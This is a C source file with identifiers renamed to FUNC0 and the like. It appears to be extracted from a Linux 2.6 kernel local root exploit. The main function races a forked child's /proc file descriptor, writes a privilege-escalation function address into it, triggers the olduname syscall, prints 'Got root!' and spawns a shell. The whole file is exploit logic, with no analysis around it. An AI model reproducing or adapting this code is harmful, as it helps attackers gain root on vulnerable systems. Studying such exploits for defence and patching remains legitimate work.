#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  O_RDWR ; 
 int /*<<< orphan*/  __NR_olduname ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int FUNC1 () ; 
 scalar_t__ get_cur_task_and_escalate_priv ; 
 int /*<<< orphan*/  FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 () ; 
 int /*<<< orphan*/  gid ; 
 int /*<<< orphan*/  FUNC4 () ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ) ; 
 scalar_t__ iz_kern2600_10 ; 
 int /*<<< orphan*/  FUNC6 () ; 
 int /*<<< orphan*/  FUNC7 (char*,char*,int) ; 
 int FUNC8 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int FUNC10 (int*) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC15 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  uid ; 
 int /*<<< orphan*/  FUNC16 (int,char*,int) ; 

int FUNC17(int ac, char **av)
{
	int fd[2];
	int pid;
	char tapz[4];


	uid = FUNC3();
	gid = FUNC2();
	FUNC13(uid, uid, uid);
	FUNC12(gid, gid, gid);
	
	FUNC6();
	
	//while (1) 
	{
		pid = FUNC1();
		if (pid == -1)
		{
			FUNC9("fork");
			return (-1);
		}
		if (pid)
		{
			char path[1024];
			/* I assume next opened fd will be 4 */
			FUNC14(path, "/proc/%d/fd/4", pid);
			while (!FUNC5(0))
			{
				fd[0] = FUNC8(path, O_RDWR);
				if (fd[0] != -1)
				{
					if(iz_kern2600_10)
                              {
                                    FUNC7(tapz, (char *)get_cur_task_and_escalate_priv, sizeof(int));
                                    FUNC16(fd[0], tapz, 4);
                              }
					FUNC0(fd[0]);
				}
			}
			if(iz_kern2600_10)
                  {
                        FUNC15(__NR_olduname, NULL);
                  }
                  FUNC11("\t\t+ Got root!\n");
			FUNC4();
			return (0);
		}
	
		while (!FUNC5(0))
		{
			if (FUNC10(fd) != -1)
			{
				FUNC0(fd[0]);
				FUNC0(fd[1]);
			}
		}
	}
}